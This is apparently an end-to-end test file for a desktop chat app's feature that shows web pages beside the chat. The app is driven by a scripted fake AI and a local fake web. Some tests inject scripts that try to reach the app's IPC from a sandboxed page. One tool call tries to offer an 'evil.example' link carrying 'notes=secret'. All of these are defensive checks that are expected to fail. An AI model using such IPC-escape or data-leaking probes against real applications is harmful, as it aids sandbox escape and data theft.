// Pages beside the chat (src-tauri/src/chat/pages.rs, chat/pages/view.rs;
// the look-and-show plan's Milestone 2):
// - `show_page` brings the page up in a Page tab: its own WebView2 (its own
//   profile), laid over the tab by Rust — no Yap IPC in it at all
//   (`window.__TAURI_INTERNALS__` absent, Yap's IPC unreachable); Back /
//   Reload / Save a shot / Open in your browser; the answer keeps it (its
//   pill, `pages` in chats.json); its tab closes it.
// - "Ask Yap about this" on words selected there: quoted over Chat's box,
//   asked as a selection.
// - `snap_page` takes a shot of the page (loaded out of sight) and shows it
//   as a picture: a picture tab and a pill, kept like a pasted picture.
// - `offer_browser` puts a button under the answer: a click opens the page
//   in the person's browser (`open_external`, kept by a test run).
//
// Nothing leaves the PC: the model is the scripted fake AI
// (support/fake-llm.js), the web a local fake (support/fake-web.js, through
// the debug-only YAP_WEB_STANDIN: the page loads from the stand-in). The
// page's own webview is a native window over Yap's: CDP screenshots of the
// main page don't show it, so the checks read it through the debug-only
// `e2e_page_view_eval` / `e2e_page_views`. Fictional pages only.
import fs from 'node:fs';
import path from 'node:path';
import { test as base, expect, expectStore, setConfig, openView, openSettings, closeSettings } from './support/fixtures.js';
import { startFakeLlm } from './support/fake-llm.js';
import { startFakeWeb, FORT_JOY_URL } from './support/fake-web.js';
import { readPng } from './support/png.js';

const BROWSERS = [
  { key: 'Brave', name: 'Brave', command: '"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"' },
  { key: 'Firefox-308046B0AF4A39CB', name: 'Firefox', command: '"C:\\Program Files\\Mozilla Firefox\\firefox.exe" -osint -url "%1"' },
];

const test = base.extend({
  fakeLlm: [
    async ({}, use) => {
      const fake = await startFakeLlm();
      await use(fake);
      await fake.close();
    },
    { scope: 'worker' },
  ],
  fakeWeb: [
    async ({}, use) => {
      const fake = await startFakeWeb();
      await use(fake);
      await fake.close();
    },
    { scope: 'worker' },
  ],
  yapOptions: [
    async ({ fakeLlm, fakeWeb }, use) => {
      await use({
        name: 'chat-pages',
        env: {
          ...fakeWeb.env,
          YAP_E2E_NET_ALIASES: `${new URL(fakeWeb.base).host}=wiki.example.com`,
          // Windows' registered browsers, as a test run has them (shell/browsers.rs).
          YAP_E2E_BROWSERS: JSON.stringify(BROWSERS),
        },
        config: chatConfig(fakeLlm),
      });
    },
    { scope: 'worker' },
  ],
});

/**
 * Chat on the fake AI with the web on. (Not learning from chats: a new
 * chat has the last one read for memory at once, and that call would take
 * the next scripted step.)
 */
function chatConfig(fakeLlm) {
  return { webSearch: true, memoryLearnChats: false, llmScopes: { chat: { enabled: true, provider: 'custom', baseUrl: fakeLlm.base, model: 'fake-chat' } } };
}

const KEY = `page:${FORT_JOY_URL}`;
const chatCalls = (fakeLlm, from) => fakeLlm.requests.slice(from).filter((r) => r.tools?.length);
const toolResult = (request) => JSON.parse(request.messages.filter((m) => m.role === 'tool').at(-1).content);

/** A script run in the page's own webview: its JSON result, parsed. */
async function inPage(yap, script) {
  const raw = await yap.invoke('e2e_page_view_eval', { key: KEY, script });
  return JSON.parse(raw);
}

/** The pages alive now. */
const views = (yap) => yap.invoke('e2e_page_views');

async function ask(main, text) {
  await openView(main, 'Chat');
  // A new chat: the last test's tabs and pages are its own.
  await main.getByRole('button', { name: 'New chat' }).first().click();
  await expect(main.getByTestId('chat-doc')).toHaveCount(0);
  await main.getByRole('textbox', { name: 'Message' }).fill(text);
  await main.getByRole('button', { name: 'Send' }).click();
}

test('show_page brings the live page up beside the chat: its own webview, no Yap IPC, Open in your browser', async ({ yap, main, fakeLlm, shot }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([
    { tools: [{ name: 'show_page', args: { url: FORT_JOY_URL, section: 'Map' } }] },
    { content: 'It’s open beside the chat: the map is under Map.' },
  ]);
  await ask(main, `Bring up the treasure map page ${FORT_JOY_URL}`);

  // Every tool-using model with the web gets the page tools, told how in one line.
  await expect.poll(() => chatCalls(fakeLlm, from).length).toBeGreaterThanOrEqual(2);
  const calls = chatCalls(fakeLlm, from);
  expect(calls[0].tools).toEqual(expect.arrayContaining(['show_page', 'snap_page', 'offer_browser']));
  expect(calls[0].system).toContain('show_page brings a live page up beside the chat');
  expect(toolResult(calls[1])).toMatchObject({ success: true, shown: true, displayText: 'Brought up wiki.example.com/wiki/Fort_Joy beside the chat' });

  // The Page tab, the page in it (the stand-in's), its title from the page.
  const tab = main.getByTestId('chat-page');
  await expect(tab).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-page-title')).toHaveText('Fort Joy - Example Wiki', { timeout: 20_000 });
  await expect
    .poll(async () => (await views(yap)).find((v) => v.key === KEY), { timeout: 20_000 })
    .toMatchObject({ url: FORT_JOY_URL, made: true, loaded: true, onScreen: true });
  expect(await inPage(yap, 'document.title')).toBe('Fort Joy - Example Wiki');
  expect(await inPage(yap, "document.querySelector('figcaption').textContent")).toBe('Every treasure chest marked');

  // No Yap IPC there at all: nothing of Tauri's, no web messages, and Yap's
  // IPC endpoint unreachable from the page.
  expect(await inPage(yap, 'typeof window.__TAURI_INTERNALS__')).toBe('undefined');
  expect(await inPage(yap, 'typeof window.__TAURI__')).toBe('undefined');
  expect(await inPage(yap, 'typeof window.__TAURI_INVOKE_KEY__')).toBe('undefined');
  const opened = (await yap.invoke('e2e_opened_urls')).length;
  // (WebView2's own chrome.webview.postMessage is there, but web messages
  // are off and nothing of Yap's listens: a message goes nowhere.)
  await inPage(
    yap,
    "(function(){try{window.chrome.webview.postMessage({cmd:'open_external',url:'https://evil.example/'});return 'sent';}catch(e){return 'refused';}})()"
  );
  const reached = await inPage(
    yap,
    "(function(){var x=new XMLHttpRequest();try{x.open('POST','http://ipc.localhost/open_external',false);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({url:'https://evil.example/'}));return 'status '+x.status;}catch(e){return 'blocked';}})()"
  );
  expect(reached).not.toBe('status 200');
  expect((await yap.invoke('e2e_opened_urls')).length).toBe(opened);
  // Its own profile: what it stores isn't Yap's.
  await inPage(yap, "localStorage.setItem('yap-pages-probe','1'); document.cookie='probe=1; path=/'; 'ok'");
  expect(await main.evaluate(() => document.cookie.includes('probe=1'))).toBe(false);

  // The answer: its pill, and its steps folded under it.
  await expect(main.getByText('It’s open beside the chat')).toBeVisible();
  await expect(main.getByTestId('chat-page-pill')).toHaveCount(1);
  await expect(main.getByTestId('chat-page-pill')).toContainText('wiki.example.com');
  await expect(main.getByText('Brought up a page')).toBeVisible();
  await shot(main, '01-page-beside-the-chat');

  // Open in your browser: open_external (a test run keeps the link).
  await main.getByTestId('chat-page-open').click();
  await expect.poll(() => yap.invoke('e2e_opened_urls')).toContain(FORT_JOY_URL);

  // Kept with the answer.
  await expectStore(yap, 'chats.json', (s) =>
    s.conversations.some((c) => c.messages.at(-1)?.pages?.[0]?.url === FORT_JOY_URL && c.messages.at(-1).pages[0].section === 'Map')
  );

  // Save a shot: a picture of the page as it is, its tab, kept with the answer.
  await main.getByTestId('chat-page-shot').click();
  await expect(main.getByTestId('chat-picture')).toBeVisible({ timeout: 20_000 });
  await expect(main.getByTestId('chat-picture-caption')).toHaveText('A shot of Fort Joy - Example Wiki');
  await expect
    .poll(() => main.getByTestId('chat-picture-img').evaluate((img) => img.complete && img.naturalWidth > 0), { timeout: 10_000 })
    .toBe(true);
  // The page stays alive behind it, out of sight; its tab brings it back.
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(false);
  await expectStore(yap, 'chats.json', (s) => s.conversations.some((c) => c.messages.at(-1)?.pictures?.some((p) => p.caption === 'A shot of Fort Joy - Example Wiki')));
  const tabs = main.getByTestId('chat-panel-tab');
  await expect(tabs).toHaveCount(2);
  await tabs.first().click();
  await expect(tab).toBeVisible();
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(true);

  // Something of Yap's over it (Settings): out of sight until it goes.
  await openSettings(main);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(false);
  await closeSettings(main);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.onScreen).toBe(true);

  // Its tab closed: the page goes.
  await main.getByRole('button', { name: /^Close Fort Joy - Example Wiki|^Close wiki\.example\.com/ }).click();
  await expect.poll(async () => (await views(yap)).some((v) => v.key === KEY)).toBe(false);
});

test('words selected on the page: Ask Yap about this quotes them over the box, asked as a selection', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  fakeLlm.scriptChat([{ tools: [{ name: 'show_page', args: { url: FORT_JOY_URL } }] }, { content: 'It’s beside the chat.' }]);
  await ask(main, `Show me ${FORT_JOY_URL}`);
  await expect.poll(async () => (await views(yap)).find((v) => v.key === KEY)?.loaded, { timeout: 20_000 }).toBe(true);
  await expect(main.getByText('It’s beside the chat.')).toBeVisible();

  // Select the map's caption in the page, then its menu's Ask Yap about this
  // (a test run never shows the native menu: the debug command does what it does).
  const selected = await inPage(
    yap,
    "(function(){var r=document.createRange();r.selectNodeContents(document.querySelector('figcaption'));var s=getSelection();s.removeAllRanges();s.addRange(r);return s.toString();})()"
  );
  expect(selected).toBe('Every treasure chest marked');
  expect(await yap.invoke('e2e_page_view_ask', { key: KEY })).toBe('Every treasure chest marked');
  const bar = main.getByTestId('chat-quote');
  await expect(bar).toBeVisible();
  await expect(bar).toContainText('About Fort Joy - Example Wiki:');
  await expect(bar).toContainText('Every treasure chest marked');

  // Asked: the model is told what was selected, and where.
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ content: 'Those are the chests on the map.' }]);
  await main.getByRole('textbox', { name: 'Message' }).fill('What does this mean?');
  await main.getByRole('button', { name: 'Send' }).click();
  await expect(main.getByText('Those are the chests on the map.')).toBeVisible();
  const sent = fakeLlm.requests.slice(from).find((r) => r.messages?.length);
  const said = JSON.stringify(sent.messages);
  expect(said).toContain('The user selected this text in wiki.example.com');
  expect(said).toContain('Every treasure chest marked');
  await expect(main.getByTestId('chat-quote-sent').last()).toContainText('Every treasure chest marked');
});

test('snap_page takes a shot of the page and shows it as a picture tab', async ({ yap, main, fakeLlm, shot }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([{ tools: [{ name: 'snap_page', args: { url: FORT_JOY_URL } }] }, { content: 'Here’s a shot of the page, beside the chat.' }]);
  await ask(main, `Get me a screenshot of ${FORT_JOY_URL}`);

  // Its picture tab, as the turn goes.
  await expect(main.getByTestId('chat-picture')).toBeVisible({ timeout: 40_000 });
  await expect(main.getByTestId('chat-picture-caption')).toHaveText('A shot of wiki.example.com');
  await expect(main.getByText('Here’s a shot of the page')).toBeVisible();
  const result = toolResult(chatCalls(fakeLlm, from)[1]);
  expect(result).toMatchObject({ success: true, shown: true, picture: 'p1', w: 1280, h: 800, displayText: 'Took a shot of wiki.example.com/wiki/Fort_Joy' });
  // A model that can't see is told not to describe it.
  expect(result.note).toContain("You can't see it");
  // Its pill; the page it was of, its source line; stored like a pasted picture.
  await expect(main.getByTestId('chat-picture-pill')).toHaveCount(1);
  await expect(main.getByTestId('chat-picture-source')).toContainText('From wiki.example.com');
  const file = path.join(yap.dataDir, 'chat-images', `${result.id}.png`);
  expect(fs.existsSync(file)).toBe(true);
  const png = readPng(fs.readFileSync(file));
  expect([png.width, png.height]).toEqual([1280, 800]);
  await expect(main.getByText('Took a shot of a page')).toBeVisible();
  await shot(main, '02-a-shot-of-the-page');
  // The page loaded for it is gone.
  await expect.poll(async () => (await views(yap)).filter((v) => v.key.startsWith('snap:')).length).toBe(0);
});

test('offer_browser puts a button under the answer: the person opens the page in their browser', async ({ yap, main, fakeLlm }) => {
  await setConfig(yap, main, chatConfig(fakeLlm));
  const from = fakeLlm.requests.length;
  fakeLlm.scriptChat([
    {
      tools: [
        { name: 'offer_browser', args: { url: FORT_JOY_URL, why: 'the interactive map' } },
        // Not a link from the person or a search: refused, no button.
        { name: 'offer_browser', args: { url: 'https://evil.example/?notes=secret', why: 'a prize' } },
      ],
    },
    { content: 'The interactive map works best in your browser.' },
  ]);
  const before = (await yap.invoke('e2e_opened_urls')).length;
  // (Worded so the model isn't made to search first: a model on this PC
  // — the fake's address is — is, for a question that needs the web.)
  await ask(main, `Give me a button for the map page ${FORT_JOY_URL}`);
  await expect(main.getByText('works best in your browser')).toBeVisible({ timeout: 20_000 });
  const offer = main.getByTestId('chat-offer');
  await expect(offer).toHaveCount(1);
  await expect(offer).toContainText('Open the interactive map in your browser');
  // Never opened by the model: nothing until the person clicks.
  expect((await yap.invoke('e2e_opened_urls')).length).toBe(before);
  const refused = chatCalls(fakeLlm, from)[1].messages.filter((m) => m.role === 'tool').map((m) => JSON.parse(m.content));
  expect(refused[1]).toMatchObject({ success: false, displayText: "Didn't offer evil.example/?notes=secret: not a link from you or the search" });
  await offer.click();
  await expect.poll(() => yap.invoke('e2e_opened_urls')).toContain(FORT_JOY_URL);
  await expectStore(yap, 'chats.json', (s) => s.conversations.some((c) => c.messages.at(-1)?.offers?.[0]?.why === 'the interactive map'));
  await expect(main.getByText('Offered a page for your browser')).toBeVisible();

  // Settings → General → Links: the browsers this PC has registered; one
  // picked, every "Open in …" names it (and open_external opens in it).
  await openSettings(main, 'General');
  const pick = main.getByRole('combobox', { name: 'Open links in' });
  await expect(pick.locator('option')).toHaveText(['Default browser', 'Brave', 'Firefox']);
  await pick.selectOption('Brave');
  await expect.poll(async () => (await yap.invoke('get_config')).openLinksIn).toBe('Brave');
  await closeSettings(main);
  expect(await yap.invoke('browser_label')).toBe('Brave');
  await expect(offer).toContainText('Open the interactive map in Brave');
  const times = async () => (await yap.invoke('e2e_opened_urls')).filter((u) => u === FORT_JOY_URL).length;
  const was = await times();
  await offer.click();
  await expect.poll(times).toBe(was + 1);
  // Back to Windows' default: "your browser" again.
  await setConfig(yap, main, { openLinksIn: '' });
  await expect(offer).toContainText('Open the interactive map in your browser');
});
